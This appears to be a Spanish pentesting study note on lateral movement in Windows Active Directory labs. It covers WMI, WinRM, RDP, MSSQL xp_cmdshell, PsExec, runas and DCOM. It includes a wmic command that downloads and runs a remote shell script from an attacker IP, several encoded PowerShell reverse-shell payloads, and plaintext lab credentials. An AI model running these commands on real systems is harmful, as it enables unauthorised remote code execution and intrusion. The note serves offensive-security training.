#rdp #mssql #winrm
Debemos tener en cuenta que además de las técnicas que se mencionan aquí podemos movernos lateralmente con técnicas como:
- [[Credenciales en Windows#Pass-the-Hash (PtH)]]
- [[Credenciales en Windows#OverPass-the-Hash]]
- [[Credenciales en Windows#Pass-the-Ticket (PtT)]]
- [[Credenciales en Windows#Silver ticket (Ataque TGS)]]


Nos planteamos este escenario cuando somos un usuario sin privilegios administrativos locales o de dominio. Aún podemos tratar de movernos entre distintos hosts. Bloodhound nos permite comprobar escenarios del tipo 
- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

## WMI
### Ejecutar comandos con wmic vía `/node`
Esta utilidad ha quedado recientemente obsoleta. 
- Ejemplo de generación de código en máquina 192.168.50.73 desde nuestra máquina comprometida con cmd
	```powershell
	wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
	```
	Si monitorizasemos 192.168.50.73 veríamos aparecer el proceso `win32calc.exe` como jen como usuario
	- Con esta misma idea podríamos envíarnos una revshell del siguiente modo (no me ha funcionado): 
	```powershell
	wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell -nop -c ""iex (New-Object Net.WebClient).DownloadString('http://192.168.45.160:8000/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.45.160 443"""
	```
### Ejecutar ataque con powershell
`Invoke-WmiMethod` es un **cmdlet de PowerShell** que permite invocar métodos en clases de WMI (Windows Management Instrumentation). Básicamente, **es la versión en PowerShell de `wmic process call create`**
En este caso, debemos crear un objeto credential y un CIM (Common Information Model ) a través de `New-CimSession`. Ejemplo completo envíando revshell (creada con powershell -base64 de revshells - funciona):
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGw...QAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

## RDP
### Enumerando usuarios y equipos del grupo RDesktop 
#### Comprobando usuarios que tienen acceso vía rdp a un equipo 
- Con Powershell `Get-NetLocalGroupMember`
	```powershell
	Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
	```
- Con `bloodound` 
	- Seleccionamos el nodo
	- Buscamos inbound execution rights (derechos de ejecución entrante)
	- Opciones RDP
#### Buscando equipos que permitan RDP 
- PowerView (No comprobado)
	```powershell
	$computers = Get-NetComputer -FullData | Select-Object dnshostname 
	foreach ($computer in $computers) { Get-NetLocalGroupMember -ComputerName $computer.dnshostname -GroupName "Remote Desktop Users" }
	```
- Bloodhound
	```cypher
	match p=(g:Group)-[:CanRDP]->(c:Computer)  where g.name STARTS WITH 'DOMAIN USERS'  AND c.operatingsystem CONTAINS 'Server'  return p
	```
## WinRM
### Enumerando usuarios del grupo Remote Managment
- **Con powerview** `Get-NetLocalGroupMember`
    ```powershell
     Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
    ```
    
- Con query personalizada en bloodhound
    ```
    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p
    ```
### Estableciendo sesión
#### `Enter-PSSession` - Powershell
Opción si tenemos powershell tanto en la máquina atacante como a la que queremos pivotar. Crea una sesión interacitva
- Ejemplo de creación de sesión
	```powershell
		$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -ForcePS $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) 
		Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
	```
#### Windows - `winrs`: Sin powershell. 
Está más indicado para ejecutar comandos individuales y no requiere powershell en el servidor. 
- Ejemplo de ejecución de comandos: 
	```powershell
	winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
	```
- Ejemplo de revshell
```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQ...bABvAHMAZQAoACkA"
```
- Linux
	```bash
	evil-winrm -i $target -u <username>
	```
	-  Para subir/descargar archivos en una sesión `evil-winrm`
		- Subir archivos
			```powershell
			upload /home/user/scripts/exploit.ps1 C:\Users\Administrador\Desktop\exploit.ps1
			```
		- Descargar archivos
			```
			download C:\ruta\archivo.txt /ruta/local/archivo.txt
			```
### Estableciendo sesión - problema del double Hop
Dado que en WinRM obtenemos un ticket TGS, no podemos ejecutar algunos comandos que involucran comunicarse con otros hosts. Ejemplo:
```powershell
#Comando desde la máquina atacante para establecer powershell remoting (OK)
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm
# El comando a continuación ejecuta una solicitud LDAP o Kerberos a DC01 (Falla)
Get-DomainUser -SPN
```
#### Solución 1: **PSCredential Object**

Una posible solución es envíar nuevamente nuestras credenciales
```powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)
```

Ahora, si intentamos ejecutar comandos que involucren servicios con autenticación delegada e incluimos la flag `-credenti-Credentialal $Cred` , podremos acceder a estos servicios:
```powershell
get-domainuser -spn -credential $Cred | select samaccountname
```

#### Solución 2: **Register PSSession Configuration**

Otra solución es que en la sesión de autenticación se pasen, además de las credenciales de `backupadm` para que siempre se ejecuten los comandos con las credenciales de este usuario.
```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -ConfigurationName  backupadmsess
```

## SQL Server
### Enumerando usuarios con derechos de administrador en SQL
- Query personalizada de Bloodhound
	```cypher
	MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
	```
### PowerUpSQ,1443
- [Chuleta interesante](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
- Enumerando instancias de MSSQL    
    ```powershell
    cd .\\PowerUpSQL\\
    Import-Module .\\PowerUpSQL.ps1
    Get-SQLInstanceDomain
    ```
- Autenticando sobre una instancia MSSQL (Windows)
    ```powershell
    Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\\damundsen" -password "SQL1234!" -query 'Select @@version'
    ```
- Autenticando sobre una instancia MSSQL - Linux
    ```bash
    #Con credenciales Windows
    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth 
    #Con credenciales mssql
    mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60
    ```
- Una vez autenticados
	- Seleccionando  **enable_xp_cmdshell**
	    ```bash
	    SQL> enable_xp_cmdshell
	    ```

	- Ejecutando comandos a nivel de sistema
	    ```bash
	    xp_cmdshell whoami /priv
	    ```

## Obtener PS como otro usuario - Windows
### Runas
Runas no funciona sin una GUI (no funcionaría en una revshell ó WinRM). No se consideraría del todo movimiento lateral, ya que no nos permite conectarnos en equipos distintos al que estamos
- Ejecución de runas como `OTRO_USUARIO`
	```powershell
	runas /user:OTRO_USUARIO powershell
	```
	`runas` **NO eleva permisos automáticamente**, solo cambia de usuario.Para obtener permisos completos, debes **elevar la sesión con `-Verb runAs`**. Deberíamos escribir lo siguiente para obtener permisos completos (si los tiene `OTRO_USUARIO`)
	```powershell
	Start-Process powershell -Verb runAs
	```
	lo que nos dará acceso completo 
- Ejecucin de runas directamente con permisos elevados
	```powershell
	runas /user:OTRO_USUARIO "cmd /c start powershell -Verb runAs"
	```

### psexec
- Ejecutar ps como otro usuario. Se necesitan permisos de administrador local en el equipo al que queremos conectarnos, y además debe estar disponible el recurso  `ADMIN$`
	```powershell
	.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
	```

## DCOM
DCOM (**Distributed Component Object Model**) es una tecnología de Microsoft que permite la comunicación entre objetos COM en diferentes equipos a través de una red. Se usa en entornos de **Windows y Active Directory (AD)** para que aplicaciones interactúen de forma remota.
Básicamente, permite ejecutar **métodos remotos en otro equipo** sin necesidad de autenticación interactiva, siempre que el usuario tenga los permisos adecuados.
Está por defecto activado en los sistemas Windows. 
- Desde una powershell con privilegios elevados, creamos una instancia MMC (Microsoft Management Console), pasándole como segundo argumento la máquina a la que queremos pivotar
	```powershell
	$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
	```
- Con esta instancia podemos ejecutar comandos de forma remota del siguiente modo 
	```powershell
	$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
	```
	Los agumentos son:  `Command`, `Directory`, `Parameters`, `WindowsState`, y solo nos interesan el primero y el tercero
- Podríamos ejecutar una revshell del siguiente modo: 
	```powershell
		$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAa...AHMAZQAoACkA","7")
	```